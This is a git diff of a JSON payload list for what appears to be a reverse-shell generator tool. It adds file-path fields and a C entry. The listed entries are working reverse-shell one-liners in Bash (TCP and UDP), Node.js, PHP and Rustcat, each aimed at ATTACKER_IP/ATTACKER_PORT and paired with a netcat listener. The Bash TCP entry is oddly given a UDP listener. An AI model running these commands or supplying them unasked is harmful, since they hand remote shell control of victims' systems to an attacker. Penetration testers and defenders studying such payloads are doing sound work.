@@ -4,35 +4,53 @@
       "uniqueID": 1,
       "description": "Bash TCP Reverse Shell",
       "reverseShell": "sh -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1",
-      "listener": "nc -u -lvp ATTACKER_PORT"
-
+      "listener": "nc -u -lvp ATTACKER_PORT",
+      "isFile": false,
+      "path": ""
     },
     {
       "name": "Bash UDP",
       "uniqueID": 2,
       "description": "Bash UDP Reverse Shell",
       "reverseShell": "sh -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1",
-      "listener": "nc -u -lvp ATTACKER_PORT"
+      "listener": "nc -u -lvp ATTACKER_PORT",
+      "isFile": false,
+      "path": ""
     },
     {
         "name": "Node.js",
         "uniqueID": 3,
         "description": "Node.js Reverse Shell",
         "reverseShell": "require('child_process').exec('nc -e sh ATTACKER_IP ATTACKER_PORT')",
-        "listener": "nc -u -lvp ATTACKER_PORT"
+        "listener": "nc -u -lvp ATTACKER_PORT",
+        "isFile": false,
+        "path": ""
       },
       {
         "name": "PHP System",
         "uniqueID": 4,
         "description": "PHP System Reverse Shell",
         "reverseShell": "php -r '$sock=fsockopen('ATTACKER_IP',ATTACKER_PORT);system('sh <&3 >&3 2>&3');'",
-        "listener": "nc -u -lvp ATTACKER_PORT"
+        "listener": "nc -u -lvp ATTACKER_PORT",
+        "isFile": false,
+        "path": ""
       },
       {
         "name": "Rustcat",
         "uniqueID": 5,
         "description": "Rustcat Reverse Shell",
         "reverseShell": "rcat ATTACKER_IP ATTACKER_PORT -r sh",
-        "listener": "nc -u -lvp ATTACKER_PORT"
+        "listener": "nc -u -lvp ATTACKER_PORT",
+        "isFile": false,
+        "path": ""
+      },
+      {
+        "name": "C",
+        "uniqueID": 6,
+        "description": "C Reverse Shell",
+        "reverseShell": "",
+        "listener": "nc -u -lvp ATTACKER_PORT",
+        "isFile": true,
+        "path": "revShell/revShell.c"
       }
   ]
